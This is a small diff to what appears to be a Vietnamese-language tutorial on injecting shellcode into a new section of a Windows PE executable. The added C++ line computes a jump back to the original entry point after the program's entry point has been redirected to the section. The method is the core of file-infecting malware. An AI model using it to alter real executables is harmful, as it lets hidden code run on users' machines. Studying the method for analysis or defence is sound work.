@@ -366,6 +366,7 @@ DWORD calculateJMPAdress(DWORD instructionAddress, DWORD targetAddress) {
 Cuối cùng, ta đã có thể tạo ra một shellcode hoàn chỉnh và thêm shellcode vào section cùng với việc đổi `OEP` theo địa chỉ của section là vấn đề của chúng ta đã hoàn thành.
 
 ```Cpp
+DWORD nextJMPAddress = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + sizeof(shellCode) - 1;
 DWORD oldOEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 DWORD jmpRVA = calculateJMPAdress(nextJMPAddress, oldOEP);
 *(DWORD*)(shellCode + 20) = jmpRVA;
